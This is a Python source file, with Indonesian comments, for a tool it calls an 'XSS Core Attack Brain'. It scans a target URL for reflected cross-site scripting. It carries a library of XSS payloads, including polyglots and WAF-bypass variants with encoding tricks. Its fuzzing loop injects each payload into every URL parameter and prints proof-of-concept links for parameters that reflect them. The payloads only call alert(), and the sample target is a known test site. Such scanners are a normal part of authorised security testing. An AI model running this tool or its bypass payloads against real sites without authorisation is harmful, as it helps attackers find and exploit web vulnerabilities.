import requests
import urllib.parse
from colorama import Fore, Style
import copy

class XSSPayloadEngine:
    def __init__(self):
        # 1. PAYLOAD LIBRARY (DATABASE SERANGAN)
        self.payloads = {
            'basic': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)//"
            ],
            'attribute_context': [
                "\"><script>alert(1)</script>",
                "' onmouseover='alert(1)",
                "\" autofocus onfocus=alert(1) x=\""
            ],
            'polyglot': [
                "javascript:/*--></title></style></textarea></script><xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
            ],
            'waf_bypass': [
                "<sCrIpT>alert(1)</ScRiPt>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>", # Decimal encoded
                "<svg/onload=alert(1)>"
            ]
        }

    def obfuscate(self, payload, technique='url'):
        """Fitur Mutasi Payload untuk WAF Bypass"""
        if technique == 'url':
            return urllib.parse.quote(payload)
        elif technique == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        return payload

def analyze_reflection(response_text, payload):
    """Mengecek apakah payload muncul kembali (Reflected) di dalam respon"""
    # Kita cari payload mentah. Jika server melakukan sanitasi (misal < jadi &lt;), 
    # maka ini tidak dianggap Vulnerable (karena aman).
    if payload in response_text:
        return True
    return False

def run_xss_scan(target_url):
    print(f"\n{Fore.CYAN}[*] MODULE START: XSS Core Attack Brain{Style.RESET_ALL}")
    print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{target_url}")
    print(f"{Fore.WHITE}[*] Mode: Reflected XSS & Parameter Fuzzing")
    print("-" * 60)

    engine = XSSPayloadEngine()
    
    # 1. Parsing Parameter URL
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print(f"{Fore.RED}[!] No parameters found in URL (e.g., ?id=1). Scan aborted.")
        print(f"{Fore.YELLOW}[Tip] Masukkan URL lengkap dengan parameter, contoh: http://testphp.vulnweb.com/listproducts.php?cat=1")
        print("-" * 60)
        return

    print(f"{Fore.YELLOW}[+] Detected Parameters: {list(params.keys())}")
    
    # User-Agent agar tidak dianggap bot
    headers = {'User-Agent': 'ZeroBurst-XSS-Engine/1.0'}
    
    vulnerable_found = False

    # 2. INTELLIGENT FUZZING LOOP
    for param_name in params:
        print(f"\n{Fore.CYAN}[*] Testing Parameter: {Fore.WHITE}'{param_name}'")
        
        # Kita tes berbagai jenis konteks payload
        all_tests = []
        all_tests.extend(engine.payloads['basic'])
        all_tests.extend(engine.payloads['attribute_context'])
        all_tests.extend(engine.payloads['waf_bypass'])
        
        for payload in all_tests:
            # Buat URL baru dengan payload injeksi
            # Kita copy parameter asli agar parameter lain tetap ada
            current_params = copy.deepcopy(params)
            current_params[param_name] = [payload] # Inject Payload Disini!
            
            # Reconstruct URL
            new_query = urllib.parse.urlencode(current_params, doseq=True)
            attack_url = parsed._replace(query=new_query).geturl()
            
            try:
                # Kirim Request
                res = requests.get(attack_url, headers=headers, timeout=5)
                
                # Analisa Respon
                if analyze_reflection(res.text, payload):
                    print(f"   {Fore.RED}[VULNERABLE] Reflected XSS Found!")
                    print(f"   ├── Payload : {payload}")
                    print(f"   └── Link PoC: {attack_url}")
                    vulnerable_found = True
                    break # Pindah ke parameter selanjutnya jika sudah ketemu 1 celah
                else:
                    # Uncomment baris ini jika ingin mode 'Verbose' (berisik)
                    # print(f"   {Fore.BLACK}[Failed] {payload[:30]}...") 
                    pass
                    
            except requests.exceptions.RequestException:
                print(f"   {Fore.RED}[!] Connection Error / WAF Blocked Request")

    print("\n" + "-" * 60)
    if vulnerable_found:
        print(f"{Fore.RED}[!] CRITICAL: Target appears vulnerable to XSS.")
    else:
        print(f"{Fore.GREEN}[OK] No simple reflected XSS vectors found.")
    print(f"{Fore.CYAN}[*] XSS Scan Completed.{Style.RESET_ALL}")